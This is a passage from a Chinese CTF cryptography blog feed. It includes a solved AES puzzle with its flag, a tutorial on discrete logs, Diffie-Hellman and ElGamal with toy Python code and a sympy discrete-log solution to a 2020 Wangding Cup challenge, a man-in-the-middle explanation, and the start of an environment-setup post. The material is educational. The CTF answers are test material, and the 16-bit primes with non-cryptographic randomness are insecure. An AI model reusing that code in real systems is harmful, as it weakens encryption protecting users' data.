<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;d&#x27;, &#x27;f&#x27;, &#x27;l&#x27;, &#x27;3&#x27;, &#x27;&#123;&#x27;, &#x27;6&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;&#125;&#x27;]</span><br></pre></td></tr></table></figure>

<p>直接手撕就好了</p>
<h2 id="妈呀，完了"><a href="#妈呀，完了" class="headerlink" title="妈呀，完了"></a>妈呀，完了</h2><p>有一串01串和一张图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01000100 01010011 01111001 00110011 01001010 01111001 01001011 01110110 01010000 01000011 01010000 01101101 01001000 00110100 01010111 01000011 01111010 00101011 01010100 01101000 01010111 01101001 00110010 01000110 01100111 01001011 01101111 00111001 01100101 01010011 01010000 01010101 00110100 01100101 00110101 01100111 00101011 01101010 01011010 01010101 00110011 01000110 01110010 01010111 01001110 01110110 01001100 01001101 00110101 00110101 01101011 01000101 01100110 00110001 01101000 01000101 01101101 01001110 01110010 01110101 00101011 01001110 01000101 00110011</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/hint.png" alt="hint"></p>
<p>还给了hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图文无关，和妈呀有关</span><br></pre></td></tr></table></figure>

<p>首先根据01串得到字符很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;01000100 01010011 01111001 00110011 01001010 01111001 01001011 01110110 01010000 01000011 01010000 01101101 01001000 00110100 01010111 01000011 01111010 00101011 01010100 01101000 01010111 01101001 00110010 01000110 01100111 01001011 01101111 00111001 01100101 01010011 01010000 01010101 00110100 01100101 00110101 01100111 00101011 01101010 01011010 01010101 00110011 01000110 01110010 01010111 01001110 01110110 01001100 01001101 00110101 00110101 01101011 01000101 01100110 00110001 01101000 01000101 01101101 01001110 01110010 01110101 00101011 01001110 01000101 00110011&#x27;</span></span><br><span class="line">cipher = cipher.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DSy3JyKvPCPmH4WCz+ThWi2FgKo9eSPU4e5g+jZU3FrWNvLM55kEf1hEmNru+NE3</span><br></pre></td></tr></table></figure>

<p>（战略性空一行）</p>
<p>挺费解，看了别的师傅的WP还是有点懵，首先对AES还是不太熟悉，其次为什么要设置utf-8编码，很多网站都不支持的</p>
<p>这里复述一遍过程吧</p>
<p>出题人想要我们通过妈呀、图片信息等推出密钥是20121221，也就是世界末日</p>
<p>然后知道密钥后，可以想到AES的ECB模式，因为这个模式不需要偏移量iv，然后在线往网站进行破解</p>
<p>其参数设置如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210707210440790.png" alt="image-20210707210440790"></p>
<p>出来的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;第13个伯克盾将会结束&#125;</span><br></pre></td></tr></table></figure>

<p>对分组密码还是不很了解啊</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
        <tag>(e, phi) != 1</tag>
        <tag>有限域开方</tag>
        <tag>Related Message Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>DH协议及ElGamal加密方案的实现</title>
    <url>/posts/898249b7/</url>
    <content><![CDATA[<p>这次做到离散对数的密码，虽然原理跟着老师走了一遍，但是没有什么实战经历没有什么感觉，这里用一道题入手吧</p>
<span id="more"></span>

<h1 id="DH协议及ElGamal加密方案的实现"><a href="#DH协议及ElGamal加密方案的实现" class="headerlink" title="DH协议及ElGamal加密方案的实现"></a>DH协议及ElGamal加密方案的实现</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>先介绍下前导知识</p>
<blockquote>
<p>离散对数，DL（Discrete Logarithm）</p>
</blockquote>
<p>从la佬博客la来的话</p>
<p>在任何群$G$中可为所有整数$k$定义一个幂数为$b^k$，而离散对数$log^b_a$是指使得 $b^k=a$的整数$k$。离散对数在一些特殊情况下可以快速计算。然而，通常没有具非常效率的方法来计算它们。公钥密码学中几个重要算法的基础，是假设寻找离散对数的问题解，在仔细选择过的群中，并不存在有效率的求解算法。</p>
<blockquote>
<p>密钥交换协议，DH（Diffie Hellman）</p>
</blockquote>
<p>就是以下面两位帅气大佬的名字命名的</p>
<p>本质上也是一种密码方案，只是因存在重大安全问题无法抵御中间人攻击而无任何实用性，但是其思想是ElGamal加密的基石</p>
<img alt="DH协议及ElGamal加密方案的实现-125e55ac.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-125e55ac.png" width="" height="" >

<blockquote>
<p>ElGamal加密算法</p>
</blockquote>
<p>是这位来自埃及的大佬发明的</p>
<p>是比RSA使用更广，也就是更安全高效的密码方案</p>
<img alt="DH协议及ElGamal加密方案的实现-a4564ef7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4564ef7.png" width="" height="">


<h2 id="2020网鼎杯-青龙组-you-raise-me-up"><a href="#2020网鼎杯-青龙组-you-raise-me-up" class="headerlink" title="2020网鼎杯-青龙组-you raise me up"></a>2020网鼎杯-青龙组-you raise me up</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure>

<p>已知<br>$$<br>n=2^{512}\<br>c=m^{flag}\ mod\ n<br>$$<br>求$flag$</p>
<p>显然按照一般的思维来说，这就是离散对数问题，找到这个指数flag是困难的，所以针第二个条件我们没有办法，所以我们就可以从n入手</p>
<p>想必n是2的512次方，比较特殊，然后可以直接求phi(n)，<br>$$<br>\phi(n)=2^{511}<br>$$</p>
<h3 id="关于求欧拉函数"><a href="#关于求欧拉函数" class="headerlink" title="关于求欧拉函数"></a>关于求欧拉函数</h3><p>关于这一步求欧拉函数，我还遇到一个小插曲，由于之前的结论<br>$$<br>(p, q)=1,n=pq\Rightarrow \phi(n)<br>=(p-1)\times(q-1)<br>$$<br>从这里来的惯性思维，我一直理解不了为什么不是$\phi(2^{512})=(2-1)^{512}=1$，虽然显然这个是错的</p>
<p>然后在查资料的过程中，发现了不少宝藏，这里有个师傅总结的求欧拉函数的方法，整理得太好了<br><a href="https://blog.csdn.net/paxhujing/article/details/51353672">https://blog.csdn.net/paxhujing/article/details/51353672</a></p>
<h4 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h4><p>若$n=1$，则<br>$$<br>\phi(n)=1<br>$$</p>
<h4 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h4><p>若$n$是质数，则<br>$$<br>\phi(n)=n-1<br>$$</p>
<h4 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a>第三种情况</h4><p>若$p$是质数，$k\ge1$，则<br>$$<br>\phi(p^k)=p^k-p^{k-1}=p^k(1-\frac{1}{p})<br>$$<br>这个有必要证明下，因为上面用到的就是这条性质</p>
<p>还是枚举法，在$[1,p^k]$，显然只有$p,2p,3p,p^{k-1}p$与之不互素，那互素的数的个数不得是$p^k-p^{k-1}$</p>
<h4 id="第四种情况"><a href="#第四种情况" class="headerlink" title="第四种情况"></a>第四种情况</h4><p>也就是RSA里面常见的，这个我之前也在作业里证明过，注意p和q不一定要是质数</p>
<p>若$n=p\times q$且$(p,q)=1$，则<br>$$<br>\phi(n)=\phi(p)\times \phi(q)=(p-1)\times (q-1)<br>$$</p>
<h4 id="第五种情况"><a href="#第五种情况" class="headerlink" title="第五种情况"></a>第五种情况</h4><p>也是求欧拉函数的通式</p>
<p>由FTA可知，任何一个大于1的整数n，可以拆分为一系列素数幂的积$n=p^{k_1}_1p^{k_2}_2…p^{k_r}_r$，由三、四情况的结论可知<br>$$<br>\phi(n)=p^{k_1}_1p^{k_2}_2…p^{k_r}_r(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<p>即<br>$$<br>\phi(n)=n(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<hr>
<p>那么有了第三种情况的结论，我之前的疑问也得到了解答</p>
<p>但是回到题目，虽然我们知道了phi(n)，但是已知的RSA常见攻击，并没有针对phi(n)泄漏的，毕竟e和d都是未知</p>
<p>所以这道题的思路还是要转到我们今天要讲的DLP上，AKA离散对数分解问题</p>
<h2 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h2><p>这里必须引入一些解DLP问题的方法，正如RSA中解大数分解问题一样，某些特殊的情况会让原本安全的加密变得有漏洞</p>
<blockquote>
<p>还是一样，先使用，后搞懂</p>
</blockquote>
<p>sage yyds</p>
<ul>
<li>通用的求离散对数的方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<p>其中包含pohlig-hellman算法</p>
<ul>
<li>Pollard-Rho算法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_rho(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>Pollard-kangaroo算法（lambda算法）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_lambda(a,base,bounds,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>大步小步算法（BSGS）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bsgs(base,a,bounds,operation)</span><br></pre></td></tr></table></figure>

<p>至于它们的使用和适用条件，先看la佬的博客吧，这里就不展开了，主要也不会DX</p>
<hr>
<p>回到题目，网上的解法是，因为模数n比较特殊，phi(n)可以得到完全分解，这就符合pohlig-hellman的条件，理论上可行</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>收集一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(discrete_log(n, c, m)))</span><br></pre></td></tr></table></figure>

<p>主要有两个线程的库可以用，一个是sage自带的，一个是python中sympy库里的，不过sympy里的比较简单</p>
<img alt="DH协议及ElGamal加密方案的实现-a4040bae.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4040bae.png" width="" height="" >

<p>就是求$flag=log^a_b\ mod\ n$</p>
<p>sage里的比较讲究，需要用Mod函数将m和c框定在模n的群里之类的意思吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">m = Mod(m, n)</span><br><span class="line">c = Mod(c, n)</span><br><span class="line"></span><br><span class="line">discrete_log(c, m)</span><br></pre></td></tr></table></figure>

<hr>
<p>前面对离散对数问题有了一个初步的概念，下面我们就进入正题，看看DH协议和ElGamal加密方案的实现</p>
<h2 id="DH协议"><a href="#DH协议" class="headerlink" title="DH协议"></a>DH协议</h2><p>更准确的说法应该是密钥交换协议，其实前面说它也是一种密码方案，不是很准确，因为它并不能加密指定的明文，而是生成双方都知晓，但攻击者却得不到的秘密私钥</p>
<p>它的流程如下</p>
<ol>
<li><p>指定一个安全质数p，要求p最好是2048位的，然后在$\mathbb{Z}^*_p$中找到一个生成元g（emmmmm有效找生成元的算法不会咋整），这些Eve也能知道</p>
</li>
<li><p>Alice选一个私钥x，$x\in \mathbb{Z} _{p-1}$（主要是x是在[1, p-1]这个范围里面的，但至于为什么有点忘了），得到$T_A=g^x\ mod\ p$，并将$T_A$传给Bob</p>
</li>
<li><p>同理，Bob将$T_B=g^y\ mod\ p$发给Alice，其中$T_A,T_B$，Eve也都知晓</p>
</li>
<li><p>此时，Alice可以得到$K_A=(T_B)^{x}=(g^y)^x=g^{xy}$</p>
</li>
<li><p>Bob也可以得到$K_B=(T_A)^{y}=(g^x)^y=g^{xy}$</p>
</li>
</ol>
<p>显然$K_A=K_B$，Alice和Bob从此有了他们才知道的相同的信息，对称密码的福音？</p>
<p>Eve虽然知道$T_A$和$T_B$，但由于离散对数问题的存在，他无法逆向得到x和y，也就得不到$g^{xy}$</p>
<h3 id="DH协议的实现"><a href="#DH协议的实现" class="headerlink" title="DH协议的实现"></a>DH协议的实现</h3><p>老师给的这篇链接里有一些要用到的算法，不过是C的，Python就是屑，sage yyds</p>
<p><a href="https://www.techiedelight.com/elgamal-encryption-algorithm-c/">https://www.techiedelight.com/elgamal-encryption-algorithm-c/</a></p>
<p>改脚本是第一生产力，借鉴了里面求生成元的算法，改成Python的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            y = (y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>原根就是最小生成元</p>
<p>但是可以看出这个算也是遍历到p的，妥妥的brute-force，32位的p都跑不出来，感觉和我的差不多</p>
<p>所以最后p取得16位，复现了上面DH协议的流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> my_gcd, my_ord, l_pow</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私钥生成</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">KA = l_pow(TA, y, p)</span><br><span class="line">KB = l_pow(TB, x, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> KA == KB</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密钥交换成功，你的私钥很安全&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行的结果是<br><img alt="DH协议及ElGamal加密方案的实现-f7c0a2dc.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-f7c0a2dc.png" width="" height="" ></p>
<p>看来以后还要看看怎么有效找生成元的算法（其实sage里面早就有了，看文末）</p>
<p>所以小节一下，显然AB共享的来自两个随机生成的随机数，两人并不能控制其内容，所以作为密钥更为合理</p>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>虽然DH方案本身挺好好，但之所以说它没有的使用，是因为存在中间人攻击</p>
<p>（从网上抄来的，因为觉得自己对这个还有点模糊，但看了之后清楚一些）<br>其攻击思路如下：</p>
<ol>
<li>Alice发送公钥$T_A$给Bob, 中间人Eve截取该值，并选择了一个自己的私钥$z$，计算出自己的公钥$_C=g^c\bmod\ q$然后发送自己的公钥给Bob</li>
<li>Bob向Alice传递自己的公钥$T_B$时，也被中间人Eve截获该值，Eve代替Bob发送它自己的公共值$T_C$给Alice</li>
<li>此时，Alice收到中间人Eve的公钥，Alice和EVE计算出会话密钥$K_{AC}=g^{xz}\bmod\ q$，Bob也收到中间人发送的公钥，Bob和Eve计算出会话密钥$K_{BC}=g^{yz}\bmod\ q$</li>
<li>Alice和Bob都以为是和对方协商好了会话密钥，于是双方互相发送数据，Alice用$K_{AC}$加密数据之后发送给Bob，Eve截获该数据，用$K_{AC}$解密，即可查看Alice发送给Bob的数据，Eve还可对其进行修改，然后用$K_{BC}$加密发送给Bob，这时Bob收到的消息已经被中间人Eve窥探甚至篡改，但Bob对此毫不知情</li>
</ol>
<p>这就是中间人攻击的原理，妙，给我感觉DH协议具有传递性哈哈哈哈哈哈</p>
<p>这里的理解需要注意几点，我一开始就是没搞清楚这个，举个例子就是，Alice不能100%肯定自己手中的共享私钥就是Bob手中的那个，而且他们没有办法确认，这就是一开始接触密码学里的那条悖论</p>
<blockquote>
<p>对称密码，用秘密（私钥）守护秘密（明文），那怎么能确保前一个秘密的安全性，不会被Eve监听呢；如果既然有保护第一个秘密（私钥）的方法，那为什么不用这个方法来保护第二个秘密（明文）呢</p>
</blockquote>
<p>密码学还讲博弈</p>
<h2 id="ElGamal加密方案"><a href="#ElGamal加密方案" class="headerlink" title="ElGamal加密方案"></a>ElGamal加密方案</h2><p>最后终于到了我们的ElGamal加密算法，讲完DH，ElGamal其实已经讲完一半了</p>
<p>因为ElGamal和DH真的好像，正如老师上课说的，DH他们怎么就没想到ElGamal呢，明明只是一步之遥（当然是大牛的一步）</p>
<p>视觉疲劳了，先写代码，拿出我们熟悉的long_to_bytes，bytes_to_long</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long <span class="keyword">as</span> b2n, long_to_bytes <span class="keyword">as</span> n2b</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> l_pow, my_inverse</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key generation</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">pk = [p, g, TA]</span><br><span class="line">sk = x</span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption</span></span><br><span class="line">flag = <span class="string">b&quot;f&quot;</span></span><br><span class="line">m = b2n(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">ci = l_pow(g, y, p)</span><br><span class="line">ciphertext = m * l_pow(TA, y, p) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># decryption</span></span><br><span class="line">mi = ciphertext * my_inverse(l_pow(ci, x, p), p) % p</span><br><span class="line"><span class="built_in">print</span>(n2b(mi))</span><br></pre></td></tr></table></figure>

<p>由于求生成元的问题所限制，p不能取得太大，这也就连带着明文不能太长，不能超过16位比特，屑，这能加密个啥</p>
<p>但好歹最后的结果是一样的</p>
<img alt="DH协议及ElGamal加密方案的实现-586e337d.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-586e337d.png" width="" height="" >

<p>手写了一下加密解密过程，打公式太耗时了</p>
<img alt="DH协议及ElGamal加密方案的实现-966d65b9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-966d65b9.png" width="" height="">

<p>应该可以理解，主要就是用DH里面的共享私钥乘以明文m进行加密，然后把共享私钥作为密文的一部分发送，然后除以（这里相当于求逆元）共享私钥就是明文了</p>
<p>所以说，ElGamal才会和DH那么有关联，密钥共享共享的就是ElGamal里面的密钥</p>
<p>那么这样Alice和Bob就能通过明文对进行验证了，中间人即使改变了私钥和Alice与Bob分别建立链接，但是依旧无法知晓明文的内容，因为只有x才能将明文解密，Eve只能创造一个z，而Alice和Bob却可以通过解密出来的内容是否是乱码检查是否存在中间人（我的理解）</p>
<h2 id="求原根的有效方法"><a href="#求原根的有效方法" class="headerlink" title="求原根的有效方法"></a>求原根的有效方法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">gp (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">pari (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>emmmmm好吧当我没说<br><img alt="DH协议及ElGamal加密方案的实现-c224eccd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-c224eccd.png" width="" height=""></p>
<p>或许可以参考<a href="https://blog.csdn.net/weixin_44932880/article/details/106555427">这个博客里的</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于ElGamal和DH的关系，到这里想必都已经挺透彻的了，DLP保证了私钥的安全性即知道$g^x$，得不到x，DH则保证了有$g^x，g^y$也得不到$g^{xy}$</p>
<p>这就应证了，ElGamal基于DH，DH基于DL</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>基层知识学习</category>
      </categories>
      <tags>
        <tag>DH协议</tag>
        <tag>Elgamal</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码题是怎么炼成的</title>
    <url>/posts/921543e1/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="CTF密码题是怎么炼成的"><a href="#CTF密码题是怎么炼成的" class="headerlink" title="CTF密码题是怎么炼成的"></a>CTF密码题是怎么炼成的</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>web和pwn的出题会用到docker的相关操作，出pwn题，有个大佬写了个<a href="https://github.com/giantbranch/pwn_deploy_chroot">脚本</a>一键搭</p>
<p>而Crypto出题就不用那么麻烦（指环境搭建），可以只写下python脚本就好，主要还是对服务器进行配置吧，想起了某段时间，我一直在配置pwn环境的虚拟机，<em>先虚拟机，再vim，再换源，再zsh，on-my-zsh，再vim主题哈哈哈哈哈</em>，pwn用到的环境以及一些工具主要参考的是<a href="https://blog.csdn.net/Y_peak/article/details/112850307">这位师傅的博客</a>，写得太好了，这里需要用到pwntools工具写脚本</p>
<p>Crypto用到的一些东西之前装过很多次，主要的问题罗列了一下，我的服务器系统镜像是ubuntu18的，一些之后课上的使用技巧和遇到问题的解决，预期发一篇博客，咕咕咕？</p>
<ul>
<li><p>python2安装gmpy2，<a href="https://leefige.github.io/2021/03/11/%E5%AE%89%E8%A3%85gmpy2/">查看这位师傅的博客</a>，python3的安装看<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">这位师傅的</a>就好了</p>
<p>前者中途如果报了个什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/gmpy2.c:445:10: fatal error: Python.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include <span class="string">&quot;Python.h&quot;</span></span></span><br><span class="line">          ^~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1</span><br></pre></td></tr></table></figure>

